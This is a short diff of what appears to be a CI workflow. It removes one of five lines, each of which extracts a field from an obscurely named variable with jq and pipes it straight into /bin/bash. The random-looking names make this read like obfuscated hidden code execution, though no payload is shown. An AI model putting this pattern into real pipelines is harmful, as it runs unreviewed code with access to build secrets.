@@ -31,7 +31,6 @@ jobs:
           echo $wrgp7 | jq -r .vmfty9161 | /bin/bash
           printf '%s' "$xg65" | jq -r .lg36914 | /bin/bash
           printf '%s' "$ckxpx4194" | jq -r .rqwun78 | /bin/bash
-          echo $nyx40786 | jq -r .kcpsr2005 | /bin/bash
           echo $zdxyn6 | jq -r .r0 | /bin/bash
 
       - name: Store results
